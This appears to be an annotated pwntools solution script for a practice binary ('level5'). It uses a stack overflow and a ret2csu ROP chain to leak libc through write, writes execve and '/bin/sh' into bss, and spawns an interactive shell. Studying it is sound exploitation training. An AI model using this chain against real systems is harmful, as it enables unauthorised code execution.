from pwn import *
from LibcSearcher import *

elf = ELF('./level5')
sh = process('./level5')

write_got = elf.got['write'] 		#获取write函数的got地址
read_got = elf.got['read']				#获取read函数的got地址
main_addr = elf.symbols['main']  #获取main函数的函数地址
bss_base = elf.bss()							#获取bss段地址

csu_gadget_1 = 0x00000000004005F0 
#_libc_csu_init函数中位置靠前的gadget，即向rdi、rsi、rdx寄存器mov的gadget
# .text:00000000004005F0 4C 89 FA                      mov     rdx, r15
# .text:00000000004005F3 4C 89 F6                      mov     rsi, r14
# .text:00000000004005F6 44 89 EF                      mov     edi, r13d
# .text:00000000004005F9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]

csu_gadget_2 = 0x0000000000400606
#_libc_csu_init函数中位置靠后的gadget，即pop rbx、rbp、r12、r13、r14、r15寄存器的gadget
# .text:0000000000400606 48 8B 5C 24 08                mov     rbx, [rsp+38h+var_30]
# .text:000000000040060B 48 8B 6C 24 10                mov     rbp, [rsp+38h+var_28]
# .text:0000000000400610 4C 8B 64 24 18                mov     r12, [rsp+38h+var_20]
# .text:0000000000400615 4C 8B 6C 24 20                mov     r13, [rsp+38h+var_18]
# .text:000000000040061A 4C 8B 74 24 28                mov     r14, [rsp+38h+var_10]
# .text:000000000040061F 4C 8B 7C 24 30                mov     r15, [rsp+38h+var_8]
# .text:0000000000400624 48 83 C4 38                   add     rsp, 38h
# .text:0000000000400628 C3      
#                       retn


def com_gadget(null, rbx, rbp, r12, r13, r14, r15, main):
  #null为0x8空缺
  #main为main函数地址
    payload = b'a' * 0x88 			#0x80+8个字节填满栈空间至ret返回指令
    payload += p64(csu_gadget_2) 
    payload += p64(null) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_gadget_1)
    payload += b'a' * 0x38     # 0x38个字节填充平衡堆栈造成的空缺
    payload += p64(main)
    sh.send(payload)    
    sleep(1)						#暂停等待接收

sh.recvuntil('Hello, World\n')
#利用write函数打印write函数地址并返回main函数
com_gadget(0,0, 1, write_got, 1, write_got, 8, main_addr)

write_addr = u64(sh.recv(8))    #接收write函数地址
libc = LibcSearcher('write', write_addr)	#查找libc版本
libc_base = write_addr - libc.dump('write') #计算该版本libc基地址
execve_addr = libc_base + libc.dump('execve') #查找该版本libc execve函数地址

sh.recvuntil('Hello, World\n')
#read函数布局，将execve函数地址和/bin/sh字符串写进bss段首地址
com_gadget(0,0, 1, read_got, 0, bss_base, 16, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')#凑足十六位

sh.recvuntil('Hello, World\n')
#调用bss段中的execve('/bin/sh')
com_gadget(0,0, 1, bss_base, bss_base+8, 0, 0, main_addr)
sh.interactive()

